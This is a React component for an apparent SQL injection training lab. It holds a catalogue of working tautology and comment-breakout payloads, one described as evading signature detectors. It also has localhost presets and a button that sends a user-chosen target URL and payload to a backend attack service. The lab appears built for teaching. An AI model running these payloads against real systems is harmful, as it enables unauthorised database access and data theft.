import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, Globe, Terminal, Play, RotateCcw, ShieldAlert, Server, Wifi, Cpu, CheckCircle2, XCircle, Code, Database, Search, Filter, Copy, Check, Maximize2, Minimize2 } from 'lucide-react';
import { saveTestLog } from '../utils/logger';
import { executeAttack } from '../services/api';
import { delay, isErrorLine, getLineDelay, getPhaseAfterLine } from '../utils/terminalAnimation';

export default function RemoteClassicInjection() {
  const [targetUrl, setTargetUrl] = useState('http://127.0.0.1:2000/login');
  const [payload, setPayload] = useState("' OR 1=1 --");
  const [simulating, setSimulating] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [consoleLogs, setConsoleLogs] = useState([]);
  const [terminalExpanded, setTerminalExpanded] = useState(false);
  const [simResult, setSimResult] = useState(null); // 'success' | 'failed' | null
  const [exposedData, setExposedData] = useState([]);
  const scrollContainerRef = useRef(null);
  const terminalRef = useRef(null);
  const [expandedHeight, setExpandedHeight] = useState(null);
  const currentPhaseRef = useRef(0);

  // Payload Explorer / Launcher States
  const [activeCatalogTab, setActiveCatalogTab] = useState('payloads'); // 'payloads' | 'presets'
  const [payloadSearchTerm, setPayloadSearchTerm] = useState('');
  const [activeCategoryFilter, setActiveCategoryFilter] = useState('all');
  const [flashPayload, setFlashPayload] = useState(false);
  const [copiedPayload, setCopiedPayload] = useState(null);

  const presets = [
    { name: "Legacy E-Commerce Shop", url: "http://127.0.0.1:2000/products?category=1", payload: "1' OR '1'='1", desc: "Tautology category injection" },
    { name: "Customer Search Node", url: "http://127.0.0.1:2000/find?id=10", payload: "10' OR 1=1 --", desc: "Integer close comment bypass" },
    { name: "Public Book Database", url: "http://127.0.0.1:2000/details?code=B2", payload: "B2' OR 'x'='x", desc: "String match always-true condition" }
  ];

  const libraryPayloads = [
    { code: "1' OR '1'='1", label: "Standard Breakout", desc: "Escapes single quote and inserts a always-true string evaluation.", cat: "standard" },
    { code: "1' OR '1'='1' -- ", label: "Standard Breakout + double-dash", desc: "String breakout followed by double-dash comment to ignore remaining server logic.", cat: "comment" },
    { code: "1' OR '1'='1' #", label: "MySQL Comment Breakout", desc: "String breakout followed by hash comment. Common in MySQL environments.", cat: "comment" },
    { code: "1' OR 1=1 -- ", label: "Integer Tautology + double-dash", desc: "Integer comparison tautology (faster database processing) with double-dash comment.", cat: "standard" },
    { code: "1' OR 1=1 #", label: "MySQL Integer Tautology", desc: "Integer comparison tautology with hash comment targeting MySQL syntax.", cat: "comment" },
    { code: "1\" OR \"1\"=\"1", label: "Double-Quote Tautology", desc: "Double-quote based tautology comparison. Successful if server uses double quotes internally.", cat: "quotes" },
    { code: "\"1' OR '1'='1", label: "Double/Single Quote Breakout", desc: "Breakout variant starting with double quote and closing with single quote syntax.", cat: "quotes" },
    { code: "\"1' OR 1=1 -- ", label: "Variant Breakout + double-dash", desc: "Variant breakout with single quote integer tautology and comment sequence.", cat: "quotes" },
    { code: "'' OR \"1\"=\"1\"", label: "Double-Quote Empty", desc: "Empty string followed by double-quote based tautology comparison.", cat: "quotes" },
    { code: "'' OR 1=1 -- '", label: "Balanced Breakout", desc: "Balanced breakout matching trailing single quote to maintain query syntax.", cat: "bypass" },
    { code: "1 OR 1=1 -- ", label: "Unquoted Numeric Breakout", desc: "Unquoted numeric parameter breakout. Targets integer fields.", cat: "standard" },
    { code: "1' OR 2=2 -- ", label: "Signature Bypass Tautology", desc: "Slightly modified tautology comparison to bypass basic signature detectors looking for '1=1'.", cat: "bypass" },
    { code: "anything' OR '1'='1", label: "Arbitrary Prefix Breakout", desc: "String breakout starting with arbitrary characters, ensuring the OR clause executes.", cat: "standard" },
    { code: "1' OR '1'='1' AND '1'='1", label: "Chained Logic Predicate", desc: "Chained logical expressions testing operator precedence rules in SQL logic.", cat: "bypass" }
  ];

  const handlePresetSelect = (preset) => {
    if (simulating) return;
    setTargetUrl(preset.url);
    setPayload(preset.payload);
    setSimResult(null);
    setExposedData([]);
    setCurrentStep(0);
    setConsoleLogs([]);
  };

  const handleInjectPayload = (pCode) => {
    if (simulating) return;
    setPayload(pCode);
    setFlashPayload(true);
    setTimeout(() => setFlashPayload(false), 850);

    // Dynamically match and adapt a realistic target URL!
    if (pCode.includes('"')) {
      // Matches Book Database setup
      setTargetUrl("http://127.0.0.1:2000/details?code=B2");
    } else if (!pCode.includes("'") || pCode.startsWith("10") || pCode.includes("1=1")) {
      // Matches Customer Search Node numeric setup
      setTargetUrl("http://127.0.0.1:2000/find?id=10");
    } else {
      // Matches Legacy E-Commerce Shop category setup
      setTargetUrl("http://127.0.0.1:2000/products?category=1");
    }

    setSimResult(null);
    setExposedData([]);
    setCurrentStep(0);
    setConsoleLogs([]);
  };

  const handleCopyPayload = (pCode) => {
    navigator.clipboard.writeText(pCode);
    setCopiedPayload(pCode);
    setTimeout(() => setCopiedPayload(null), 2000);
  };


  useEffect(() => {
    if (consoleLogs.length === 0) return;
    const container = scrollContainerRef.current;
    if (container) {
      const threshold = 100;
      const isNearBottom = container.scrollHeight - container.scrollTop - container.clientHeight <= threshold;
      if (isNearBottom) {
        container.scrollTo({
          top: container.scrollHeight,
          behavior: 'smooth'
        });
      }
    }
  }, [consoleLogs]);

  useEffect(() => {
    if (!terminalExpanded || !terminalRef.current) {
      setExpandedHeight(null);
      return;
    }
    const updateHeight = () => {
      const rect = terminalRef.current.getBoundingClientRect();
      const bottomGap = 16;
      setExpandedHeight(Math.max(window.innerHeight - rect.top - bottomGap, 300));
    };
    updateHeight();
    window.addEventListener('resize', updateHeight);
    return () => window.removeEventListener('resize', updateHeight);
  }, [terminalExpanded]);

  const addLog = (text, type = 'info', delay = 0) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        setConsoleLogs((prev) => [...prev, { text, type, timestamp: new Date().toLocaleTimeString() }]);
        resolve();
      }, delay);
    });
  };

  const handleSimulate = async () => {
    if (simulating) return;
    if (!targetUrl) {
      alert("Please enter a target URL!");
      return;
    }
    if (!payload) {
      alert("Please enter a SQL injection payload!");
      return;
    }

    setSimulating(true);
    setSimResult(null);
    setExposedData([]);
    setCurrentStep(0);
    currentPhaseRef.current = 0;
    setConsoleLogs([]);

    try {
      setCurrentStep(0);
      currentPhaseRef.current = 0;
      const res = await executeAttack('classic', targetUrl, payload);
      
      if (res && res.success) {
        const output = res.output || '';
        const lines = output.split('\n');
        const parsedLogs = lines.map(line => {
          let type = 'info';
          if (line.includes('[SYSTEM]')) type = 'system';
          else if (line.includes('[SUCCESS]') || line.includes('SUCCESS!') || line.includes('SUCCESS') || line.includes('[CONNECT] Connection successfully established.') || line.includes('[DNS] Resolved hostname to server IP:')) type = 'success';
          else if (line.includes('[WARNING]') || line.includes('[HTTP]') || line.includes('[PROBE]') || line.includes('[PAYLOAD]') || line.includes('[RESPONSE]') || line.includes('[INFO]') || line.includes('[DNS]')) type = 'warning';
          else if (line.includes('[ERROR]') || line.includes('[RESULT] FAILED') || line.includes('FAILED') || line.includes('EXPLOIT FAILED')) type = 'danger';
          return {
            text: line,
            type,
            timestamp: new Date().toLocaleTimeString()
          };
        });
        setConsoleLogs([]);
        setCurrentStep(0);
        currentPhaseRef.current = 0;
        
        const context = {
          sawTimeLine: false
        };

        for (const log of parsedLogs) {
          // 1. Print line first
          setConsoleLogs((prev) => [...prev, log]);

          if (log.text.includes("[TIME]")) {
            context.sawTimeLine = true;
          }

          // 2. Wait line-specific delay
          const lineDelay = getLineDelay(log.text);
          await delay(lineDelay);

          // 3. Error handling: if error line, break and stop animation
          if (isErrorLine(log.text)) {
            break;
          }

          // 4. Update status phase if needed
          const nextPhase = getPhaseAfterLine(log.text, currentPhaseRef.current, context);
          if (nextPhase > currentPhaseRef.current) {
            currentPhaseRef.current = nextPhase;
            setCurrentStep(nextPhase);
          }
        }

        const hasError = parsedLogs.some(l => isErrorLine(l.text));
        if (!hasError) {
          setCurrentStep(5);
          currentPhaseRef.current = 5;
        }

        const isSuccess = output.includes("SUCCESS!");
        if (isSuccess && !hasError) {
          setSimResult('success');
          setExposedData([
            { id: 1, name: "Premium Laptop A1", price: "$1,299.00", stock: 14, sku: "SKU-LAP-90" },
            { id: 2, name: "Noise-Cancelling Headphones", price: "$299.00", stock: 45, sku: "SKU-HDP-04" },
            { id: 3, name: "Wireless Mechanical Keyboard", price: "$149.00", stock: 22, sku: "SKU-KBD-88" },
            { id: 4, name: "4K IPS Design Monitor", price: "$499.00", stock: 8, sku: "SKU-MON-4K" },
            { id: 5, name: "Cybersecurity Pro Shield V2", price: "$89.00", stock: 99, sku: "SKU-SHD-02" },
            { id: 6, name: "Administrator Dev-Kit Router", price: "$0.00 (EXPOSED)", stock: 1, sku: "SKU-ADMIN-KEY" }
          ]);
          saveTestLog('Classic SQLi', payload, 'EXPLOITED', `SELECT * FROM products WHERE category = '${payload}'`);
        } else {
          setSimResult('failed');
          saveTestLog('Classic SQLi', payload, 'BLOCKED', `SELECT * FROM products WHERE category = '${payload}'`);
        }
      } else {
        setCurrentStep(0);
        const errorMsg = res.error || '';
        let displayError = '[ERROR] Attack execution failed';
        if (errorMsg.toLowerCase().includes('timeout')) {
          displayError = '[ERROR] Connection timeout';
        } else if (errorMsg.toLowerCase().includes('500') || errorMsg.toLowerCase().includes('internal server error')) {
          displayError = '[ERROR] Internal server error';
        }
        setConsoleLogs([{ text: displayError, type: 'danger', timestamp: new Date().toLocaleTimeString() }]);
        setSimResult('failed');
      }
    } catch (err) {
      setCurrentStep(0);
      let displayError = '[ERROR] Attack execution failed';
      if (err.message && err.message.toLowerCase().includes('timeout')) {
        displayError = '[ERROR] Connection timeout';
      } else if (err.message && (err.message.toLowerCase().includes('500') || err.message.toLowerCase().includes('server error'))) {
        displayError = '[ERROR] Internal server error';
      }
      setConsoleLogs([{ text: displayError, type: 'danger', timestamp: new Date().toLocaleTimeString() }]);
      setSimResult('failed');
    } finally {
      setSimulating(false);
    }
  };

  const handleClear = () => {
    if (simulating) return;
    setTargetUrl('http://127.0.0.1:2000/login');
    setPayload("' OR 1=1 --");
    setConsoleLogs([]);
    setExposedData([]);
    setSimResult(null);
    setCurrentStep(0);
  };

  return (
    <div className="space-y-8 select-none w-full">
      {/* Back Link */}
      <Link to="/instructions/classic-sql-injection" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
        <ArrowLeft className="w-3.5 h-3.5" />
        back to instructions page
      </Link>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full">
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          Remote Classic SQL <span className="text-cyber-blue">Injection Environment</span>
        </h1>
        <p className="text-cyber-text text-sm text-justify w-full leading-relaxed font-medium">
          Simulate classic SQL Tautology injection against remote HTTP parameters. Supply your target link, set dynamic payloads, and observe the server-side response behavior and data leakages.
        </p>
      </div>


      {/* Target Settings Card */}
      <div className="bg-cyber-card border border-cyber-border rounded-xl p-6 relative overflow-hidden space-y-5 shadow-lg w-full">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-cyber-blue" />
        <h3 className="font-sans font-bold text-base text-cyber-title tracking-widest uppercase flex items-center gap-2">
          <Server className="w-4 h-4 text-cyber-blue" />
          Target Settings
        </h3>

        <div className="space-y-4 font-mono text-xs">
          {/* Target URL */}
          <div className="space-y-1.5">
            <label className="block text-[11px] font-bold text-cyber-blue uppercase tracking-wider">
              Target Parameter URL
            </label>
            <div className="relative">
              <Globe className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
              <input
                type="text"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                disabled={simulating}
                placeholder="http://127.0.0.1:2000/products?category=1"
                className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20 transition-all font-bold tracking-wide"
              />
            </div>
          </div>

          {/* SQL Payload */}
          <div className="space-y-1.5">
            <div className="flex justify-between items-center">
              <label className="block text-[11px] font-bold text-cyber-blue uppercase tracking-wider">
                SQL Injection Payload
              </label>
            </div>

            <div className="relative">
              <Code className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
              <input
                type="text"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                disabled={simulating}
                placeholder="1' OR '1'='1"
                className={`w-full bg-cyber-input border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none transition-all text-cyber-red font-bold font-mono tracking-wider ${
                  flashPayload
                    ? 'animate-cyber-glow border-cyber-blue ring-2 ring-cyber-blue/30 shadow-[0_0_15px_rgba(26,106,255,0.4)]'
                    : 'border-cyber-border focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20'
                }`}
              />
            </div>
          </div>
        </div>

        {/* Execute & Reset Controls */}
        <div className="flex gap-3 pt-2">
          <button
            onClick={handleSimulate}
            disabled={simulating}
            className={`flex-1 flex items-center justify-center gap-2 bg-cyber-blue hover:bg-cyber-blue-light text-white py-3 rounded-lg text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_var(--accent-glow)] ${
              simulating ? 'opacity-50 cursor-not-allowed' : ''
            }`}
          >
            <Play className={`w-3.5 h-3.5 ${simulating ? 'animate-spin' : ''}`} />
            {simulating ? "Scanning..." : "Execute Injection"}
          </button>
          <button
            onClick={handleClear}
            disabled={simulating}
            className={`p-3 bg-transparent hover:bg-cyber-border/30 border border-cyber-border text-cyber-dim hover:text-cyber-text rounded-lg transition-all cursor-pointer ${
              simulating ? 'opacity-50 cursor-not-allowed' : ''
            }`}
            title="Reset Forms"
          >
            <RotateCcw className="w-4 h-4" />
          </button>
        </div>
      </div>



      {/* Exploit Status & Console Monitor at Bottom */}
      <div className="w-full space-y-6 pt-4 flex flex-col items-center">
        {/* Simulation Progress Timeline */}
        <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 font-mono text-xs space-y-4 shadow-lg w-full">
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-bold text-cyber-blue tracking-wider uppercase flex items-center gap-1.5">
              <Cpu className="w-3.5 h-3.5 text-cyber-blue" />
              status
            </span>
            <span className="text-[10px] text-cyber-dim font-bold">
              {currentStep === 0 ? "STANDBY" : `STAGE ${currentStep} / 5`}
            </span>
          </div>

          {/* Micro Progress Bar */}
          <div className="w-full bg-cyber-black h-1.5 rounded-full overflow-hidden border border-cyber-border">
            <div 
              className="bg-cyber-blue h-full transition-all duration-500 shadow-[0_0_8px_var(--accent-glow)]"
              style={{ width: `${(currentStep / 5) * 100}%` }}
            />
          </div>

          {/* Stages Icons Grid */}
          <div className="grid grid-cols-5 gap-2 text-center text-[9px] font-bold tracking-wider text-cyber-dim">
            <div className={currentStep >= 1 ? "text-cyber-blue" : ""}>1. DNS</div>
            <div className={currentStep >= 2 ? "text-cyber-blue" : ""}>2. TCP</div>
            <div className={currentStep >= 3 ? "text-cyber-blue" : ""}>3. PARAMS</div>
            <div className={currentStep >= 4 ? "text-cyber-blue" : ""}>4. INJECT</div>
            <div className={currentStep >= 5 ? "text-cyber-blue" : ""}>5. VERIFY</div>
          </div>
        </div>

        {/* Console Monitor Panel */}
        <div
          ref={terminalRef}
          className={`bg-cyber-pre border border-cyber-border rounded-xl w-full flex flex-col overflow-hidden shadow-2xl relative transition-all duration-300 ease-in-out ${
            terminalExpanded ? '' : 'h-[400px]'
          }`}
          style={terminalExpanded && expandedHeight ? { height: `${expandedHeight}px` } : undefined}
        >
          {/* Header bar */}
          <div className="bg-cyber-card border-b border-cyber-border/70 px-4 py-3 flex items-center justify-between shrink-0">
            <div className="flex items-center gap-2">
              <span className="text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5" />
              </span>
            </div>
            <button
              onClick={() => setTerminalExpanded(prev => !prev)}
              className="flex items-center gap-1 text-[9px] font-mono text-cyber-dim hover:text-cyber-blue transition-colors cursor-pointer select-none"
            >
              {terminalExpanded ? (
                <>
                  <Minimize2 className="w-3.5 h-3.5" />
                  COLLAPSE
                </>
              ) : (
                <>
                  <Maximize2 className="w-3.5 h-3.5" />
                  EXPAND
                </>
              )}
            </button>
          </div>

          {/* Terminal Body */}
          <div ref={scrollContainerRef} className="flex-1 min-h-0 p-4 overflow-y-auto font-mono text-[11px] leading-relaxed space-y-2 custom-scrollbar">
            {consoleLogs.length === 0 ? (
              <div className="text-cyber-dim/40 h-full flex flex-col items-center justify-center text-center p-8 select-none">
                <Terminal className="w-10 h-10 mb-2 opacity-20" />
                <span>Scanner Console Awaiting Payload.</span>
                <span className="text-[10px] block mt-1">Select Vulnerable Catalog Preset or type custom payload and execute scan sequence.</span>
              </div>
            ) : (
              consoleLogs.map((log, index) => {
                let colorClass = "text-cyber-text";
                if (log.type === 'system') colorClass = "text-cyber-blue font-bold";
                if (log.type === 'success') colorClass = "text-cyber-green font-bold";
                if (log.type === 'warning') colorClass = "text-[#ffbd2e] font-bold";
                if (log.type === 'danger') colorClass = "text-[#ff3a3a] font-bold";
                
                return (
                  <div key={index} className={`flex items-start gap-2 ${colorClass}`}>
                    <span className="text-cyber-dim/50 shrink-0 font-normal">[{log.timestamp}]</span>
                    <span className="whitespace-pre-wrap select-text">{log.text}</span>
                  </div>
                );
              })
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
